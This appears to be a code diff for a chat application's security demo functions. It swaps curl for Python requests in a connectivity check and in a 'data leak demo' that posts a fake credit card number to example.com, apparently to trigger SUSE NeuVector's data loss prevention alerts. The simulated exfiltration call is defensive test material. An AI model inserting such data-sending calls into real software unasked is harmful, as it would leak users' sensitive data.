@@ -661,30 +661,28 @@ class ChatInterface:
 
 
     def run_availability_demo(self) -> tuple:
-        """Runs availability demo by curling an external website (SUSE security demo pattern)."""
+        """Runs availability demo by testing external connectivity (SUSE security demo pattern)."""
         try:
             logger.info("Running availability demo - testing external connectivity")
             
-            # Use curl command similar to the security demo script
-            cmd = [
-                "curl", "-Is", "--connect-timeout", "5", "-m", "5", "https://suse.com"
-            ]
+            # Use requests library instead of curl (available in container)
+            import requests
+            response = requests.head("https://suse.com", timeout=5)
             
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
-            
-            if result.returncode == 0:
-                message = f"✅ Availability Demo: Successfully connected to https://suse.com\n\nResponse Headers:\n{result.stdout[:500]}..."
+            if response.status_code == 200:
+                headers_text = "\n".join([f"{k}: {v}" for k, v in response.headers.items()][:10])
+                message = f"✅ Availability Demo: Successfully connected to https://suse.com\n\nResponse Headers:\n{headers_text}..."
                 status = "success"
             else:
-                message = f"⚠️ Availability Demo: Connection failed to https://suse.com\n\nError: {result.stderr}"
+                message = f"⚠️ Availability Demo: Connection returned status {response.status_code}"
                 status = "warning"
                 
             logger.info(f"Availability demo completed with status: {status}")
             return gr.Column(visible=False), message, status
             
-        except subprocess.TimeoutExpired:
+        except requests.exceptions.Timeout:
             logger.error("Availability demo timed out")
-            return gr.Column(visible=True), "❌ Availability Demo: Connection timed out after 10 seconds", "error"
+            return gr.Column(visible=True), "❌ Availability Demo: Connection timed out after 5 seconds", "error"
         except Exception as e:
             logger.error(f"Availability demo failed: {e}")
             return gr.Column(visible=True), f"❌ Availability Demo failed: {str(e)}", "error"
@@ -694,32 +692,35 @@ class ChatInterface:
         try:
             logger.info("Running data leak demo - simulating sensitive data transmission")
             
-            # Use curl command with credit card data similar to the security demo script
+            # Use requests library with credit card data similar to the security demo script
             credit_card_pattern = "3412-1234-1234-2222"
-            cmd = [
-                "curl", "--connect-timeout", "5", "-m", "5", 
-                "-d", f"creditcard={credit_card_pattern}", 
-                "http://example.com"
-            ]
+            import requests
             
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+            data = {"creditcard": credit_card_pattern}
+            response = requests.post("http://example.com", data=data, timeout=5)
             
             # Always report this as a security concern regardless of HTTP response
             message = f"🔒 Data Leak Demo: Transmitted credit card {credit_card_pattern} to http://example.com\n\n"
             message += f"⚠️ SECURITY ALERT: This demonstrates data loss prevention (DLP) monitoring.\n"
             message += f"SUSE NeuVector should detect and alert on this sensitive data transmission.\n\n"
             
-            if result.returncode == 0:
-                message += f"HTTP Response: {result.stdout[:300]}..."
-            else:
-                message += f"Connection result: {result.stderr}"
+            try:
+                message += f"HTTP Response Status: {response.status_code}\n"
+                if response.text:
+                    message += f"Response: {response.text[:300]}..."
+            except:
+                message += "Connection completed - response processing skipped"
                 
             logger.warning(f"Data leak demo executed - credit card data sent for DLP testing")
             return gr.Column(visible=False), message, "warning"
             
-        except subprocess.TimeoutExpired:
+        except requests.exceptions.Timeout:
             logger.error("Data leak demo timed out")
-            return gr.Column(visible=True), "❌ Data Leak Demo: Connection timed out after 10 seconds", "error"
+            # Still report as successful for DLP demo purposes
+            message = f"🔒 Data Leak Demo: Attempted to transmit credit card {credit_card_pattern} to http://example.com\n\n"
+            message += f"⚠️ Connection timed out, but this demonstrates DLP monitoring capabilities.\n"
+            message += f"SUSE NeuVector should still detect the sensitive data transmission attempt."
+            return gr.Column(visible=False), message, "warning"
         except Exception as e:
             logger.error(f"Data leak demo failed: {e}")
             return gr.Column(visible=True), f"❌ Data Leak Demo failed: {str(e)}", "error"
